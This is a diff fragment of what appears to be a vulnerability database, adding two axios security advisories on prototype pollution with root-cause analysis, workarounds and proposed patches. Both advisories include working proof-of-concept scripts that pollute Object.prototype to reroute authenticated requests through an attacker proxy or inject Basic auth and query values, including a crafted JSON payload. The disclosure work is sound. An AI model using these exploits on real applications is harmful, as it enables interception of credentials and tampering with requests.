+                details: "## Summary\n\nAxios\u2019 Node.js HTTP adapter can route requests through an attacker-controlled proxy when `Object.prototype.proxy` is polluted and request configuration is materialized as a regular object before dispatch.\n\nRecent axios releases harden merged request config by creating a null-prototype object. However, request interceptors run after that merge and may return a replacement config. A common immutable interceptor pattern such as `{...config}` or `Object.assign({}, config)` converts the hardened config back into a normal object. Axios then dispatches that object without re-hardening it, and the Node HTTP adapter reads `config.proxy` through the prototype chain.\n\n## Impact\n\nIn a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can route affected HTTP requests through an attacker-controlled proxy.\n\nThe highest confirmed impact is for plaintext HTTP requests. The proxy can observe explicit `Authorization` headers, axios-generated Basic auth from `config.auth`, request method, absolute URL, `Host`, and request body content. The proxy can also return its own response to axios for the affected request.\n\nThis does not establish browser impact. It also does not establish HTTPS header or body disclosure under normal TLS validation.\n\n## Affected Functionality\n\nAffected functionality is limited to axios requests that use the Node.js HTTP adapter, including default Node usage when the HTTP adapter is selected and explicit `adapter: 'http'` usage.\n\nThe relevant configuration path is `config.proxy` in the Node HTTP adapter. The hardened-bypass path requires a request interceptor such as:\n\n```js\napi.interceptors.request.use((config) => ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n```\n\nUnaffected or mitigating conditions include browser adapters, the Node fetch adapter, no polluted `Object.prototype.proxy`, an own `proxy: false` or safe own `proxy` value on the config, and hardened releases where interceptors return the original null-prototype config instead of a regular object clone.\n\n## Technical Details\n\n`lib/core/mergeConfig.js` creates a null-prototype merged config and uses own-property reads for merged values. This is intended to prevent polluted `Object.prototype` values from affecting config behavior.\n\n`lib/core/Axios.js` runs request interceptors after the merge. In both the asynchronous and synchronous interceptor paths, axios passes the interceptor-returned config into dispatch.\n\n`lib/core/dispatchRequest.js` accepts that returned config, transforms request data, selects the adapter, and calls the adapter without re-hardening or re-normalizing the config.\n\n`lib/adapters/http.js` uses own-property reads for several sensitive fields, but the initial proxy dispatch path still passes `config.proxy` directly into `setProxy()`. If an interceptor returned a regular object, `config.proxy` can resolve to inherited `Object.prototype.proxy`.\n\n## Proof of Concept of Attack\n\n```js\nimport axios from './index.js';\nimport http from 'node:http';\n\nfor (const key of [\n  'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n  'http_proxy', 'https_proxy', 'all_proxy',\n  'NO_PROXY', 'no_proxy'\n]) {\n  delete process.env[key];\n}\n\nconst listen = (handler) => new Promise((resolve, reject) => {\n  const server = http.createServer(handler);\n  server.once('error', reject);\n  server.listen(0, '127.0.0.1', () => resolve(server));\n});\n\nconst close = (server) => new Promise((resolve) => server.close(resolve));\n\nconst targetHits = [];\nconst proxyHits = [];\n\nconst target = await listen((req, res) => {\n  targetHits.push(req.url);\n  res.end('target');\n});\n\nconst proxy = await listen((req, res) => {\n  let body = '';\n  req.on('data', (chunk) => body += chunk);\n  req.on('end', () => {\n    proxyHits.push({\n      url: req.url,\n      authorization: req.headers.authorization,\n      host: req.headers.host,\n      body\n    });\n    res.setHeader('content-type', 'application/json');\n    res.end('{\"server\":\"proxy\"}');\n  });\n});\n\nObject.prototype.proxy = {\n  protocol: 'http',\n  host: '127.0.0.1',\n  port: proxy.address().port\n};\n\nconst api = axios.create();\n\napi.interceptors.request.use((config) => ({\n  ...config,\n  headers: {\n    ...config.headers,\n    'X-App': 'demo'\n  }\n}));\n\ntry {\n  const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n  const res = await api.post(\n    url,\n    {secret: 'request-body-secret'},\n    {headers: {Authorization: 'Bearer EXPLICIT_SECRET'}}\n  );\n\n  console.log({\n    response: res.data,\n    targetHits,\n    proxyHits,\n    finalConfigHasOwnProxy: Object.hasOwn(res.config, 'proxy')\n  });\n} finally {\n  delete Object.prototype.proxy;\n  await close(target);\n  await close(proxy);\n}\n```\n\nExpected vulnerable result: the response comes from the proxy, `targetHits` is empty, and `proxyHits` contains the absolute URL, authorization header, host header, and request body.\n\n## Workarounds\n\nSet an own `proxy: false` on affected requests or on an axios instance when proxy support is not required.\n\nAvoid request interceptors that return regular object clones of config in hardened releases. Returning the original config or cloning into a null-prototype object avoids this specific bypass, but this is fragile and should not replace a fix.\n\nUse the Node fetch adapter for affected requests where its behavior is compatible with the application.\n\n<details>\n<summary>Original Report</summary>\n\n## Summary\n\n  Axios hardens merged request config by creating a null-prototype object, preventing polluted Object.prototype properties from influencing request behavior. Request interceptors run after that hardening, and a normal immutable\n  interceptor pattern such as {...config} or Object.assign({}, config) re-materializes the config as a regular object. Axios then dispatches that interceptor-returned object without re-hardening it. In the Node HTTP adapter, config.proxy\n  is read through the prototype chain, allowing a polluted Object.prototype.proxy to route authenticated HTTP requests through an attacker-controlled proxy.\n\n  ## Impact\n\n  In a Node.js deployment using the HTTP adapter, an attacker who can trigger prototype pollution elsewhere in the process can cause affected axios requests to be sent through an attacker-controlled proxy when the application uses a\n  request interceptor that returns a plain object copy of the config.\n\n  Verified local impact:\n\n  - Authenticated request redirection to attacker-controlled proxy.\n  - Disclosure of explicit Authorization headers.\n  - Disclosure of axios-generated Basic auth headers from config.auth.\n  - Disclosure of request metadata: method, absolute URL, Host header.\n  - Disclosure of POST body content.\n\n  This report does not claim browser impact or proven HTTPS credential disclosure. The demonstrated credential and body disclosure is for Node HTTP-adapter requests over HTTP/plaintext.\n\n  ## Affected component\n\n  The affected component is the Node.js HTTP adapter request path after request interceptors have run.\n\n  The issue requires:\n\n  - Node.js HTTP adapter usage.\n  - A polluted Object.prototype.proxy.\n  - A request interceptor that returns a plain object copy of the config.\n  - No own proxy: false or safe own proxy property on the request config.\n\n  ## Affected versions\n\n  Confirmed affected for this specific hardening-bypass variant:\n\n  - axios@1.15.2\n  - axios@1.16.0\n\n  axios@1.16.0 was the latest published version observed via npm view axios version during validation.\n\n  Related older behavior observed during testing:\n\n  - 1.13.0, 1.13.6, 1.14.0, 1.15.0, and 1.15.1 routed via inherited Object.prototype.proxy even without the interceptor re-materialization step. That is related background, not the narrowed hardening-bypass variant described here.\n\n  ## Root cause\n\n  1. Initial hardening\n\n     Axios initially hardens merged request config by creating a null-prototype object in mergeConfig(), which is meant to prevent inherited Object.prototype properties from influencing request behavior.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  2. Interceptor re-materialization\n\n     Request interceptors run after that hardening step, and axios allows an interceptor to return a replacement config object. A common immutable pattern such as {...config} or Object.assign({}, config) converts the hardened null-\n     prototype config back into a normal object with Object.prototype as its prototype.\n     Permalinks: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199, https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  3. No post-interceptor re-hardening\n\n     Axios passes the interceptor-returned config into request dispatch without restoring the null-prototype property or otherwise normalizing the object into an own-property-only structure.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  4. Prototype-chain read of proxy in the Node adapter\n\n     The Node HTTP adapter later consults config.proxy, and this read is reachable through the prototype chain once the interceptor has re-materialized the config as a normal object. As a result, a polluted Object.prototype.proxy can\n     redirect the outgoing authenticated request through an attacker-controlled proxy.\n     Permalink: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n\n  ## Why this is a security issue and not intended behavior\n\n  Axios\u2019 threat model explicitly treats polluted Object.prototype config reads as high-impact read-side gadgets and states that axios defends reachable config-read gadgets through own-property checks and null-prototype structures. The\n  existing regression tests also assert that a polluted Object.prototype.proxy must not route requests through an attacker proxy.\n\n  This behavior is therefore a bypass of axios\u2019 existing prototype-pollution hardening, not merely a generic \u201Cpolluted process\u201D complaint. The interceptor does not need to be malicious; it can be ordinary application code that returns an\n  immutable copy of the config. The attacker-controlled piece is the polluted prototype property supplied by a separate vulnerability or dependency.\n\n  ## Realistic threat model\n\n  A realistic exploit chain is:\n\n  1. A transitive dependency or upstream parser bug allows prototype pollution in a Node.js process.\n  2. The polluted property is Object.prototype.proxy, with host and port pointing to an attacker-controlled proxy.\n  3. The application uses axios with a request interceptor that returns a plain object copy, such as adding headers immutably.\n  4. The application sends an HTTP request with credentials or sensitive body data.\n  5. Axios routes that request through the inherited proxy configuration.\n\n  This requires a prototype pollution primitive and a compatible interceptor pattern. It does not require the attacker to control the interceptor.\n\n  ## Proof of concept\n\n  Save as poc.mjs in the axios repository root:\n\n```js\n  import axios from './index.js';\n  import http from 'node:http';\n\n  const proxyEnvKeys = [\n    'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY',\n    'http_proxy', 'https_proxy', 'all_proxy',\n    'NO_PROXY', 'no_proxy'\n  ];\n\n  for (const key of proxyEnvKeys) delete process.env[key];\n\n  const listen = (handler) => new Promise((resolve, reject) => {\n    const server = http.createServer(handler);\n    server.once('error', reject);\n    server.listen(0, '127.0.0.1', () => resolve(server));\n  });\n\n  const close = (server) => new Promise((resolve) => server.close(resolve));\n\n  const targetHits = [];\n  const proxyHits = [];\n\n  const target = await listen((req, res) => {\n    let body = '';\n    req.on('data', (chunk) => body += chunk);\n    req.on('end', () => {\n      targetHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'target'}));\n    });\n  });\n\n  const proxy = await listen((req, res) => {\n    let body = '';\n    req.on('data', (chunk) => body += chunk);\n    req.on('end', () => {\n      proxyHits.push({\n        url: req.url,\n        method: req.method,\n        authorization: req.headers.authorization || null,\n        host: req.headers.host || null,\n        body\n      });\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify({server: 'proxy'}));\n    });\n  });\n\n  Object.prototype.proxy = {\n    protocol: 'http',\n    host: '127.0.0.1',\n    port: proxy.address().port\n  };\n\n  const api = axios.create();\n\n  api.interceptors.request.use((config) => ({\n    ...config,\n    headers: {\n      ...config.headers,\n      'X-App': 'demo'\n    }\n  }));\n\n  try {\n    const url = `http://127.0.0.1:${target.address().port}/api/secret`;\n\n    const explicit = await api.get(url, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const basic = await api.get(url, {\n      auth: {username: 'svc-account', password: 'prod-secret'}\n    });\n\n    proxyHits.length = 0;\n    targetHits.length = 0;\n\n    const post = await api.post(url, {secret: 'request-body-secret'}, {\n      headers: {Authorization: 'Bearer EXPLICIT_SECRET'}\n    });\n\n    console.log(JSON.stringify({\n      explicitResponse: explicit.data,\n      basicResponse: basic.data,\n      postResponse: post.data,\n      targetHits,\n      proxyHits,\n      finalConfigPrototype:\n        Object.getPrototypeOf(post.config) === Object.prototype\n          ? 'Object.prototype'\n          : 'other',\n      finalConfigHasOwnProxy:\n        Object.prototype.hasOwnProperty.call(post.config, 'proxy')\n    }, null, 2));\n  } finally {\n    delete Object.prototype.proxy;\n    await close(target);\n    await close(proxy);\n  }\n```\n\n  Run:\n```bash\n  npm ci\n  node poc.mjs\n```\n\n  ## Observed results\n\n  Representative observed output from local loopback testing:\n\n```text\n\n  {\n    \"explicitResponse\": {\"server\": \"proxy\"},\n    \"basicResponse\": {\"server\": \"proxy\"},\n    \"postResponse\": {\"server\": \"proxy\"},\n    \"targetHits\": [],\n    \"proxyHits\": [\n      {\n        \"url\": \"http://127.0.0.1:40613/api/secret\",\n        \"method\": \"POST\",\n        \"authorization\": \"Bearer EXPLICIT_SECRET\",\n        \"host\": \"127.0.0.1:40613\",\n        \"body\": \"{\\\"secret\\\":\\\"request-body-secret\\\"}\"\n      }\n    ],\n    \"finalConfigPrototype\": \"Object.prototype\",\n    \"finalConfigHasOwnProxy\": false\n  }\n\n  Additional validation showed axios-generated Basic auth is also disclosed to the proxy:\n\n  {\n    \"authorization\": \"Basic c3ZjLWFjY291bnQ6cHJvZC1zZWNyZXQ=\"\n  }\n\n```\n\n  That value decodes to:\n\n  svc-account:prod-secret\n\n  Negative controls were also tested:\n\n  - No interceptor: target receives request, proxy receives none.\n  - Interceptor mutating and returning the same config object: proxy receives none.\n  - Own proxy: false: proxy receives none.\n  - Null-prototype clone interceptor: proxy receives none.\n  - Fetch adapter in Node with the same interceptor: proxy receives none.\n\n  ## Suggested remediation\n\n  Re-harden the final request config after all request interceptors and before adapter dispatch. This should cover both asynchronous and synchronous interceptor paths.\n\n  A practical fix would be to normalize the interceptor-returned object into a null-prototype, own-property-only config before calling dispatchRequest(), or at the start of dispatchRequest() itself. Security-sensitive adapter reads should\n  also consistently use own-property access helpers. In particular, the Node HTTP adapter should not read config.proxy through the prototype chain.\n\n  ## Minimal regression test\n\n  Add an end-to-end Node HTTP adapter test that:\n\n  1. Starts a target server and attacker proxy on 127.0.0.1.\n  2. Sets Object.prototype.proxy to the attacker proxy.\n  3. Adds a request interceptor returning {...config, headers: {...config.headers}}.\n  4. Sends a request with an Authorization header.\n  5. Asserts the target server receives the request.\n  6. Asserts the attacker proxy receives no request.\n  7. Asserts the final config no longer exposes inherited proxy.\n\n  A second assertion can cover config.auth to ensure axios-generated Basic auth is not sent to the attacker proxy.\n\n  ## References / permalinks\n\n  - mergeConfig() null-prototype hardening: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/mergeConfig.js#L21-L25\n  - Async interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L187-L199\n  - Synchronous interceptor dispatch path: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/Axios.js#L204-L218\n  - dispatchRequest() receives interceptor-returned config: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/core/dispatchRequest.js#L34-L48\n  - Node HTTP adapter config.proxy read: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/lib/adapters/http.js#L816-L820\n  - Axios threat model for prototype-pollution read-side gadgets: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/THREATMODEL.md#L136-L144\n  - Existing proxy pollution regression test intent: https://github.com/axios/axios/blob/df53d7dd99b202fb194217abd127ae6a630e70dc/tests/unit/prototypePollution.test.js#L1098-L1135\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-gcfj-64vw-6mp9",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/pull/11001",
+                  "https://github.com/axios/axios/commit/1417285c69344bbcc6420a021f67dee0c6fedb2d",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v0.33.0",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
+                ]
+              },
+              {
+                atOrAbove: "1.15.2",
+                below: "1.18.0",
+                severity: "medium",
+                cwe: [
+                  "CWE-1321"
+                ],
+                identifiers: {
+                  summary: "Axios: Prototype pollution auth subfields can inject Basic auth",
+                  githubID: "GHSA-xj6q-8x83-jv6g",
+                  CVE: [
+                    "CVE-2026-67314"
+                  ]
+                },
+                details: "## Summary\n\nAxios versions after the `GHSA-q8qp-cvcw-x6jj` fix still contain prototype-pollution read-side gadgets in Basic auth subfield handling. If a host application is already affected by prototype pollution and then makes an axios request with an own `auth` object that omits `username` or `password`, axios reads inherited `Object.prototype.username` and `Object.prototype.password` values and uses them to construct an outbound `Authorization: Basic ...` header.\n\nThis does not mean axios itself pollutes prototypes. Exploitation requires a separate prototype-pollution primitive in the host process, plus an axios call pattern such as `auth: opts.auth || {}`.\n\n## Impact\n\nAn attacker who can pollute `Object.prototype.username` and/or `Object.prototype.password` can influence the Basic auth header on affected axios requests that pass an empty or partial own `auth` object.\n\nThe practical impact is outbound request tampering. The attacker can inject attacker-chosen Basic auth credentials, replace an existing `Authorization` header because axios removes it when `auth` is used, or cause downstream authorization failures.\n\nThis should not be described as automatic credential exfiltration. In the minimal reproduced case, the Basic auth values are attacker-controlled values, not secrets read from axios. Credential disclosure requires an additional application-specific condition, such as a request destination observable by the attacker and a partial real auth object with a missing polluted subfield.\n\n## Affected Functionality\n\nAffected functionality:\n\n- Node HTTP adapter Basic auth handling in `lib/adapters/http.js`.\n- Browser, web worker, React Native, and fetch shared resolver Basic auth handling in `lib/helpers/resolveConfig.js`.\n- Requests where `config.auth` is an own object but `username` and/or `password` are absent own properties.\n\nUnaffected or not accepted as core impact:\n\n- Requests with no own `auth` object after `mergeConfig()`.\n- Requests with own `auth.username` and `auth.password` values.\n- Normal axios request flow for inherited top-level `params` / `paramsSerializer` after the null-prototype `mergeConfig()` hardening.\n- Attacker-controlled `paramsSerializer` functions from JSON-only prototype pollution, because JSON pollution cannot create functions. If attacker-controlled code can install functions in the process, that is outside axios\u2019 runtime boundary.\n\n## Technical Details\n\n`mergeConfig()` returns a null-prototype top-level config object, which prevents top-level reads such as `config.auth` from inheriting polluted values. However, nested plain objects returned by `utils.merge()` still have `Object.prototype`.\n\nIn `lib/adapters/http.js`, axios correctly reads the top-level `auth` value through `own('auth')`, but then reads subfields directly:\n\n```js\nconst configAuth = own('auth');\nif (configAuth) {\n  const username = configAuth.username || '';\n  const password = configAuth.password || '';\n  auth = username + ':' + password;\n}\n```\n\nIf the caller passes auth: {} and Object.prototype.username/password are polluted, those direct subfield reads walk the prototype chain.\n\nThe same pattern exists in `lib/helpers/resolveConfig.js`:\n```js\nif (auth) {\n  headers.set(\n    'Authorization',\n    'Basic ' +\n      btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n  );\n}\n```\n\nThe fix should guard `username` and `password` with `utils.hasOwnProp`, matching the proxy-auth pattern already used elsewhere.\n\n## Proof of Concept of Attack\n\nSafe local PoC against published `axios@1.16.1`:\n\n```js\nconst http = require('node:http');\nconst axios = require('axios');\n\nObject.prototype.username = 'victim-user';\nObject.prototype.password = 'victim-password-leaked';\n\nconst server = http.createServer((req, res) => {\n  console.log({\n    url: req.url,\n    authorization: req.headers.authorization || null\n  });\n\n  res.end('{}');\n  server.close(() => {\n    delete Object.prototype.username;\n    delete Object.prototype.password;\n  });\n});\n\nserver.listen(0, '127.0.0.1', async () => {\n  await axios.get(`http://127.0.0.1:${server.address().port}/api`, {\n    auth: {}\n  });\n});\n```\n\nExpected output:\n\n```json\n{\n  \"url\": \"/api\",\n  \"authorization\": \"Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==\"\n}\n```\n\nThe base64 value decodes to `victim-user:victim-password-leaked`.\n\n## Workarounds\nAvoid passing empty or partial `auth` objects. Only set `auth` when the application has own username and password values.\n\nApplications that merge untrusted input should filter `__proto__`, `constructor`, and `prototype`, and should read optional user options with own-property checks rather than `opts.auth || {}`.\n\nWhere a wrapper must materialize optional auth, use a null-prototype object or explicitly copy only own fields.\n\n<details>\n<summary>Original Report</summary>\n\n### Summary\n\nAfter [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) (shipped in `v1.15.2`) and the further proxy-side hardening in\n[PR #10833](https://github.com/axios/axios/pull/10833) (merged 2026-05-02), the **top-level** `config.auth` and the **proxy auth**sub-fields are correctly read via `utils.hasOwnProp`. The **regular request auth sub-fields** (`config.auth.username` and `config.auth.password`) and the **`config.params` / `config.paramsSerializer`** reads inside `resolveConfig.js` are still unguarded against a polluted `Object.prototype`.\n\nWhen a polluted host process makes an axios call with the common \"optional override\" pattern (`auth: opts.auth || {}` \u2014 an empty own `{}`), the sub-field reads `configAuth.username` and `configAuth.password` walk the prototype chain and return the attacker-controlled values. Same for `params` and `paramsSerializer`. The outbound HTTP request then carries an attacker-chosen `Authorization: Basic <base64>` header and an attacker-chosen querystring, leaking credentials and exfiltrating data to whichever host the request goes to (often attacker-influenced too \u2014 i.e. the amplifier is wired into many credential-stuffing chains).\n\nReproduces against `axios` `main` HEAD (`34723be`, dated 2026-05-24)\nas well as the released `v1.16.1`.\n\n### Details\n\n**Three still-unguarded read sites** on `main` HEAD:\n\n**(1) `lib/adapters/http.js` lines 737\u2013740** (Node http adapter):\n\n```js\nconst configAuth = own('auth');         // \u2190 top-level guard OK\nif (configAuth) {\n    const username = configAuth.username || '';   // \u2190 reads .username on the inherited chain\n    const password = configAuth.password || '';   // \u2190 reads .password on the inherited chain\n    auth = username + ':' + password;\n}\n```\n\n`own('auth')` correctly applies `hasOwnProp` to the top-level `auth`\nkey. But once `configAuth` is the empty object the caller passed\n(`auth: {}`), `configAuth.username` walks the prototype chain and\npicks up `Object.prototype.username`.\n\nContrast with the proxy-auth path that PR #10833 fixed (lines 322\u2013324):\n\n```js\nconst authUsername =\n    authIsObject && utils.hasOwnProp(proxyAuth, 'username') ? proxyAuth.username : undefined;\nconst authPassword =\n    authIsObject && utils.hasOwnProp(proxyAuth, 'password') ? proxyAuth.password : undefined;\n```\n\nThis is the exact pattern needed at lines 739\u2013740 too.\n\n**(2) `lib/helpers/resolveConfig.js` lines 50 + 68** (xhr/fetch adapter shared resolver):\n\n```js\nconst auth = own('auth');               // \u2190 top-level guard OK\n...\nbtoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n//   ^ .username and .password read directly on `auth`, no hasOwnProp guard\n```\n\nSame shape \u2014 top-level guarded, sub-fields walk prototype.\n\n**(3) `lib/helpers/resolveConfig.js` lines 58\u201359** (params + paramsSerializer):\n\n```js\nnewConfig.url = buildURL(\n    buildFullPath(baseURL, url, allowAbsoluteUrls),\n    config.params,            // \u2190 direct read, not through own()\n    config.paramsSerializer   // \u2190 direct read, not through own()\n);\n```\n\nThis third site is already proposed for fix in **open** [PR #10922](https://github.com/axios/axios/pull/10922) by @Mohammad-Faiz-Cloud-Engineer (status: open, currently mergeable: false). That PR's `own('params')` / `own('paramsSerializer')` change is exactly correct; this report flags the auth sub-field sites that PR #10922 does **not** cover.\n\n### PoC\n\nThis PoC contains zero direct `Object.prototype.x = y` writes. The\npollution flows entirely from attacker-shaped JSON through a real\ndeep-merge utility (`defaults-deep@0.2.4`, ~50k weekly downloads,\nstill walks `constructor.prototype`). A hand-rolled deep merge \u2014\nthe canonical insecure backend pattern \u2014 exhibits the same pollution\nvia `__proto__` and is more common in real codebases than any named\nutility.\n\n```js\n#!/usr/bin/env node\n'use strict';\n\nconst http = require('node:http');\nconst axios = require('axios');\nconst defaultsDeep = require('defaults-deep');\n\n// Defensive: scrub any prior pollution\nconst PROTO_KEYS = ['username', 'password', 'params', 'paramsSerializer'];\nfunction scrub() {\n  for (const k of PROTO_KEYS) {\n    try { delete Object.prototype[k]; } catch (_) {}\n  }\n}\nscrub();\n\n// 1) Attacker input \u2014 what JSON.parse(req.body) would yield from an HTTP POST\nconst attackerBody = JSON.parse(`{\n  \"constructor\": {\n    \"prototype\": {\n      \"username\": \"victim-user\",\n      \"password\": \"victim-password-leaked\",\n      \"params\": {\"leak\": \"ATTACKER_QUERY_TOKEN\"}\n    }\n  }\n}`);\n\n// 2) Realistic application pattern: merge user options into defaults\nconst appDefaults = { timeout: 5000 };\ndefaultsDeep(appDefaults, attackerBody);\n//   After this line:\n//     Object.prototype.username  === \"victim-user\"\n//     Object.prototype.password  === \"victim-password-leaked\"\n//     Object.prototype.params    === { leak: \"ATTACKER_QUERY_TOKEN\" }\n\n// 3) Capture outbound request on a local listener\nconst server = http.createServer((req, res) => {\n  console.log('=== captured outbound request ===');\n  console.log(JSON.stringify({\n    method: req.method,\n    url: req.url,\n    authorization: req.headers.authorization || null,\n  }, null, 2));\n  res.end('{}');\n  server.close();\n  scrub();\n});\n\nserver.listen(0, '127.0.0.1', () => {\n  const port = server.address().port;\n\n  // 4) Realistic application wrapper: optional per-call overrides.\n  //    `auth: opts.auth || {}` is the common pattern \u2014 empty own object,\n  //    but inherited values walk the prototype chain.\n  function makeRequest(targetUrl, opts = {}) {\n    return axios.get(targetUrl, {\n      timeout: 5000,\n      auth: opts.auth || {},\n      params: opts.params || {},\n    });\n  }\n\n  makeRequest(`http://127.0.0.1:${port}/api/widget`).catch((e) => {\n    console.error('axios error:', e.message);\n    scrub();\n    process.exit(1);\n  });\n});\n```\n\nReproduction:\n\n```bash\nmkdir /tmp/axios-poc && cd /tmp/axios-poc\nnpm init -y\nnpm install axios@1.16.1 defaults-deep@0.2.4\nnode /path/to/poc.cjs\n```\n\nCaptured output (verified against released `1.16.1` AND against\n`main` at `34723be`, 2026-05-24):\n\n```json\n{\n  \"method\": \"GET\",\n  \"url\": \"/api/widget?leak=ATTACKER_QUERY_TOKEN\",\n  \"authorization\": \"Basic dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==\"\n}\n```\n\n`dmljdGltLXVzZXI6dmljdGltLXBhc3N3b3JkLWxlYWtlZA==` base64-decodes to\n`victim-user:victim-password-leaked`. The querystring carries\n`?leak=ATTACKER_QUERY_TOKEN`, which can be a full data-exfil channel\nin real chains (CSRF token, session cookie via `req.headers`, etc.).\n\n### Impact\n\n- **Credential exfiltration** via Basic auth header on the outbound\n  request. If the request URL is attacker-influenced too (common in\n  webhook/oauth-callback patterns), the credentials flow directly to\n  the attacker. If not, they flow to the legitimate destination but\n  expose victim credentials in any logs / proxies along the path.\n- **Outbound request-shape control** via inherited `params` /\n  `paramsSerializer`. With `paramsSerializer` polluted to an attacker\n  function, axios will execute that function with each `params`\n  invocation \u2014 same-process code execution from a pollution primitive.\n- **Amplifier framing** is still correct. The application-side\n  precondition is \"deep-merges attacker JSON into a config object\n  without `__proto__`/`constructor` filtering, then uses the empty-\n  fallback wrapper `auth: opts.auth || {}` / `params: opts.params || {}`.\"\n  Both halves are very common in real codebases (we tested\n  `defaults-deep`, hand-rolled merges, and several lodash-family\n  utilities; many still pollute).\n- **CWE-1321** (Improperly Controlled Modification of Object Prototype\n  Attributes \u2014 amplifier sink).\n\n### Proposed fix\n\nTwo-line change in `http.js`, matching the proxy-auth pattern PR\n#10833 already established:\n\n```diff\n--- a/lib/adapters/http.js\n+++ b/lib/adapters/http.js\n@@ -737,8 +737,10 @@\n       const configAuth = own('auth');\n       if (configAuth) {\n-        const username = configAuth.username || '';\n-        const password = configAuth.password || '';\n+        const username = utils.hasOwnProp(configAuth, 'username') ? (configAuth.username || '') : '';\n+        const password = utils.hasOwnProp(configAuth, 'password') ? (configAuth.password || '') : '';\n         auth = username + ':' + password;\n       }\n```\n\nSame pattern in `resolveConfig.js`:\n\n```diff\n--- a/lib/helpers/resolveConfig.js\n+++ b/lib/helpers/resolveConfig.js\n@@ -64,7 +64,11 @@\n   // HTTP basic authentication\n   if (auth) {\n+    const authUsername = utils.hasOwnProp(auth, 'username') ? (auth.username || '') : '';\n+    const authPassword = utils.hasOwnProp(auth, 'password') ? auth.password : '';\n     headers.set(\n       'Authorization',\n       'Basic ' +\n-        btoa((auth.username || '') + ':' + (auth.password ? encodeUTF8(auth.password) : ''))\n+        btoa(authUsername + ':' + (authPassword ? encodeUTF8(authPassword) : ''))\n     );\n   }\n```\n\nThe **`params` / `paramsSerializer`** half is already handled by open\nPR #10922's `own('params')` / `own('paramsSerializer')` change \u2014 that\nPR should be rebased / merged.\n\n### Relationship to recent prototype-pollution work\n\nSame vulnerability class as the existing public hardening, just at\nsub-field granularity:\n\n- [GHSA-q8qp-cvcw-x6jj](https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj) / [PR #10779](https://github.com/axios/axios/pull/10779) \u2014 `mergeConfig` direct-key reads. **Fixed in v1.15.2.**\n- [PR #10761](https://github.com/axios/axios/pull/10761) \u2014 `mergeDirectKeys` `in` \u2192 `hasOwnProp`. **Fixed in v1.15.x.**\n- [PR #10833](https://github.com/axios/axios/pull/10833) \u2014 proxy `auth.username/password` sub-fields. **Fixed post-1.16.1.**\n- [PR #7413](https://github.com/axios/axios/pull/7413) \u2014 `formDataToJSON` defense-in-depth. **Fixed post-1.16.1.**\n- [PR #10901](https://github.com/axios/axios/pull/10901) \u2014 `socketPath` guard. **Merged 2026-05-24.**\n- [PR #10922 (OPEN)](https://github.com/axios/axios/pull/10922) \u2014 `params` / `paramsSerializer` `own()` guard. **Proposed; not merged.**\n\nThis report adds: regular-request `auth.username` / `auth.password`\nsub-field reads in both the http adapter (lines 737\u2013740) and\nresolveConfig.js (line 68).\n\n### Reporter notes\n\n- Reported as part of a small peer-review bundle of runtime security\n  findings. The bundle's public tracking entry (without the working\n  exploit chain) is at\n  [`georgian-io/package-runtime-security-findings/advisories/AXIOS-002-prototype-pollution-config-fields.md`](https://github.com/georgian-io/package-runtime-security-findings/blob/main/advisories/AXIOS-002-prototype-pollution-config-fields.md).\n- I'm happy to submit the patch as a PR if that helps. Or, if you'd\n  prefer to fold this into open PR #10922 (whose author is actively\n  responding to comments), please let me know and I'll coordinate.\n- Threat model honesty: this is **amplifier framing** \u2014 exploitation\n  requires a separate prototype-pollution primitive elsewhere in the\n  host process. That's how the existing GHSA-q8qp-cvcw-x6jj and\n  PR #10833 were framed too, so the precedent for \"in-scope as a\n  hardening fix\" is established.\n</details>",
+                info: [
+                  "https://github.com/axios/axios/security/advisories/GHSA-xj6q-8x83-jv6g",
+                  "https://github.com/axios/axios/pull/11000",
+                  "https://github.com/axios/axios/commit/32fc489632377d214db55bfa4e2c48486a7d7ce2",
+                  "https://github.com/axios/axios/releases/tag/v1.18.0"
                 ]
               }
             ],
